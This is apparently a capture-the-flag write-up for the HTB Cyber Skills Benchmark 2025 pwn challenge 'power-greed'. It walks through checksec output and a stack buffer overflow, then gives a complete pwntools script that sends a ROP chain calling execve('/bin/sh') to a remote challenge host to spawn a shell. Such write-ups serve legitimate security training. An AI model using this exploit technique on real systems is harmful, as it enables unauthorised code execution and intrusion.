+++
title = 'HTB Global Cyber Skills Benchmark 2025 - pwn/power-greed'
date = 2025-05-27T22:23:00-04:00
draft = false
+++

Starting with file and checksec commnads, we see that we have a statically linked binary with all protections except PIE turned on.

```
[d@d-20xxx10100 challenge]$ file power_greed
power_greed: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=0b1f10b9e9720538e9c4a290c03cb9fe87a03401, for GNU/Linux 3.2.0, not stripped
[d@d-20xxx10100 challenge]$ pwn checksec --file=./power_greed
[*] '/home/d/Downloads/htb25/challenge/power_greed'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We can trigger a buffer overflow, and it looks like there is no canary.

```
[d@d-20xxx10100 challenge]$ ./power_greed
+----------------------------------------------------------+
| Volnaya ICS Controller v1.7 Beta                  [–] [x]|
+----------------------------------------------------------+
| Status: [ONLINE]                                         |
| Uptime: [47d 07h 16m]                                    |
+----------------------------------------------------------+
| 1. Diagnostics Center                                    |
| 2. Log Console                                           |
| 3. Exit                                                  |
+----------------------------------------------------------+

ics@shell> 1

+------------------------------+
| Diagnostics Center           |
+------------------------------+
| 1. Vulnerability scan.       |
| 2. Firmware update.          |
| 3. Change grids.             |
+------------------------------+

ics@shell> 1

[INFO] Scanning for vulnerabilities...

[**************************************************] 100%

[SUCCESS] Done!

+-------------------------------+
| Scanning Results              |
+-------------------------------+
| File:       power_greed       |
| Arch:       amd64             |
| RELRO:      Partial RELRO     |
| Stack:      Canary found      |
| NX:         NX enabled        |
| PIE:        No PIE (0x400000) |
| SHSTK:      Enabled           |
| IBT:        Enabled           |
| Stripped:   No                |
+-------------------------------+

[WARNING]: There is a potential Buffer Overflow, but Canary is on.

Do you want to test that? (y/n): y

[SUCCESS] Buffer size: [0x20]

[INFO] Crash test the buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

Also we see the string `/bin/sh` in the log console, which is very helpful to us.

```
+-----------------------------------------------------------+
| Log Console                                               |
+-----------------------------------------------------------+
| [18:21:14] WARNING:  Nmap scan performed.                 |
| [19:33:18] CRITICAL: Buffer Overflow triggered!           |
| [19:33:29] WARNING:  Tried to execute /bin/sh             |
| [19:34:22] CRITICAL: Segmentation Fault, program crashed! |
+-----------------------------------------------------------+

+----------------------------------------------------------+
| Volnaya ICS Controller v1.7 Beta                  [–] [x]|
+----------------------------------------------------------+
| Status: [ONLINE]                                         |
| Uptime: [47d 07h 16m]                                    |
+----------------------------------------------------------+
| 1. Diagnostics Center                                    |
| 2. Log Console                                           |
| 3. Exit                                                  |
+----------------------------------------------------------+

ics@shell>
```

Now we just need to create a ropchain that will call `execve("/bin/sh", 0, 0);`. I used ropper to find the necessary gadgets. See full solve script below.


```python
from pwn import *
import time
context.log_level = "DEBUG"

binary = ELF("./power_greed")

binsh_addr = next(binary.search(b'/bin/sh'))
print(f"address of /bin/sh: {hex(binsh_addr)}")

pop_rax = 0x000000000042adab
pop_rsi_rbp = 0x000000000040c002
pop_rdi_rbp = 0x0000000000402bd8
syscall_ret = 0x0000000000412e96
ret_gag = 0x000000000040101a

pop_rdx_al_r12_rbp = 0x000000000047d564

target = remote("83.136.253.201", 45170)

target.sendline(b"1")
target.sendline(b"1")
time.sleep(5)
target.sendline(b"y")
time.sleep(2)

payload = b"A" * 56
payload += p64(pop_rdx_al_r12_rbp)
payload += p64(0)
payload += p64(0)
payload += p64(0)

payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi_rbp)
payload += p64(binsh_addr)
payload += p64(0)
payload += p64(pop_rsi_rbp)
payload += p64(0)
payload += p64(0)
payload += p64(syscall_ret)

target.sendline(payload)
target.interactive()
```